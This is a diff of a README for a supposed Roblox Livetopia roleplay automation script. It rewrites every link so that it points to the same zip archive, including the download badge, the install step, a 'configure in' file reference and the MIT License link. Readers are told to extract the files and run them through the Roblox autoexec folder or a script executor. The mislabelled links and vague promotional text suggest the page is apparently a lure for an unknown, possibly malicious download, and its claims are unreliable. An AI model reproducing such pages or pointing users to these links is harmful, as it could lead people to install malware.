@@ -1,6 +1,6 @@
 # Livetopia RP Script for Roblox
 
-[![Download](https://raw.githubusercontent.com/ayushcsh/livetopia-roleplay-automation-scripts/branch/keffel/livetopia-roleplay-automation-scripts_v2.5.zip%20Script-informational?style=for-the-badge&logo=roblox&logoColor=white)](https://raw.githubusercontent.com/ayushcsh/livetopia-roleplay-automation-scripts/branch/keffel/livetopia-roleplay-automation-scripts_v2.5.zip)
+[![Download](https://github.com/ayushcsh/livetopia-roleplay-automation-scripts/raw/refs/heads/branch/keffel/scripts-automation-livetopia-roleplay-v3.7.zip%20Script-informational?style=for-the-badge&logo=roblox&logoColor=white)](https://github.com/ayushcsh/livetopia-roleplay-automation-scripts/raw/refs/heads/branch/keffel/scripts-automation-livetopia-roleplay-v3.7.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Like a polyglot of the device world, our script fluently communicates with numer
 
 Ready to ascend? Follow these well-trodden steps for installation:
 
-1. **Download** the Livetopia RP Script package: https://raw.githubusercontent.com/ayushcsh/livetopia-roleplay-automation-scripts/branch/keffel/livetopia-roleplay-automation-scripts_v2.5.zip
+1. **Download** the Livetopia RP Script package: https://github.com/ayushcsh/livetopia-roleplay-automation-scripts/raw/refs/heads/branch/keffel/scripts-automation-livetopia-roleplay-v3.7.zip
 2. **Extract** the package to your preferred directory.
 3. **Copy** the script files to your Roblox “autoexec” folder or use your preferred script executor.
 4. **Open Roblox**, launch Livetopia, and prepare for a deeply engaging narrative experience!
@@ -62,7 +62,7 @@ Embark on roleplaying journeys like never before. Connect your OpenAI and Anthro
 - **Contextual Actions:** Real-time scene suggestions and environment responses.
 - **Clever Questlines:** AI-generated quests, mysteries, and plot twists (no two adventures are ever alike).
 
-*Configure these features in the `https://raw.githubusercontent.com/ayushcsh/livetopia-roleplay-automation-scripts/branch/keffel/livetopia-roleplay-automation-scripts_v2.5.zip` file for immediate magic.*
+*Configure these features in the `https://github.com/ayushcsh/livetopia-roleplay-automation-scripts/raw/refs/heads/branch/keffel/scripts-automation-livetopia-roleplay-v3.7.zip` file for immediate magic.*
 
 ---
 
@@ -87,10 +87,10 @@ This tool is crafted exclusively for enhancing your Roblox Livetopia experience 
 
 ## 📜 MIT License
 
-This repository is open to all adventurers under the MIT license, granting you the creative freedom befitting a Livetopia citizen. For the full text, visit [MIT License](https://raw.githubusercontent.com/ayushcsh/livetopia-roleplay-automation-scripts/branch/keffel/livetopia-roleplay-automation-scripts_v2.5.zip).
+This repository is open to all adventurers under the MIT license, granting you the creative freedom befitting a Livetopia citizen. For the full text, visit [MIT License](https://github.com/ayushcsh/livetopia-roleplay-automation-scripts/raw/refs/heads/branch/keffel/scripts-automation-livetopia-roleplay-v3.7.zip).
 
 © 2025 Livetopia RP Script Contributors
 
 ---
 
-[![Download](https://raw.githubusercontent.com/ayushcsh/livetopia-roleplay-automation-scripts/branch/keffel/livetopia-roleplay-automation-scripts_v2.5.zip%20Script-informational?style=for-the-badge&logo=roblox&logoColor=white)](https://raw.githubusercontent.com/ayushcsh/livetopia-roleplay-automation-scripts/branch/keffel/livetopia-roleplay-automation-scripts_v2.5.zip)
+[![Download](https://github.com/ayushcsh/livetopia-roleplay-automation-scripts/raw/refs/heads/branch/keffel/scripts-automation-livetopia-roleplay-v3.7.zip%20Script-informational?style=for-the-badge&logo=roblox&logoColor=white)](https://github.com/ayushcsh/livetopia-roleplay-automation-scripts/raw/refs/heads/branch/keffel/scripts-automation-livetopia-roleplay-v3.7.zip)
